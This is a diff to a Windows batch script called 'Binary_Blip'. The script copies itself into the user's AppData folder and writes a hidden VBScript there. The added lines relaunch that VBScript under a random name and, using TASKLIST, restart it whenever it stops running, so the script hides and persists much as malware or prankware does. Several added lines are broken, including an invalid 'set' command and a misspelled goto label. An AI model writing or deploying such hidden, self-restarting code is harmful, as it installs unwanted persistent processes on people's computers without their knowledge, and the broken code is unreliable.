@@ -2,9 +2,9 @@
 color 2
 setlocal enabledelayedexpansion
 title Binary_Blip
+
 ::make a copy
 COPY %~f0 C:\Users\%USERNAME%\AppData\Local\%~nx0
-
 
 :: get PID
 for %%t in ("%temp%\%~nx0.%random%%random%%random%%random%%random%.tmp") do > "%%~ft" (
@@ -30,8 +30,10 @@ echo         Exit Do >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
 echo     End If >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
 echo Loop >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
 
-
-start "vsb_hidden" C:\Users\%USERNAME%\AppData\Local\hidden.vbs
+:vbs_start
+set name /a  = !RANDOM!
+echo !name!
+start "!name!" C:\Users\%USERNAME%\AppData\Local\hidden.vbs
 
 :echo_random
 
@@ -51,11 +53,11 @@ if not exist C:\Users\%USERNAME%\AppData\Local\%~nx0 (
 
 
 ::ceck vbs
-if not exist C:\Users\%USERNAME%\AppData\Local\hidden.vbs (
+IF not exist C:\Users\%USERNAME%\AppData\Local\hidden.vbs (
 	goto :vbs_creation
 )
 
 ::ceck if vbs is running
-::not implemented
+TASKLIST /v /fi "imagename eq wscript.exe" | find /i "!name!" > null || goto :vbs_start
 
-goto :echo_random
+goto :echo_rando
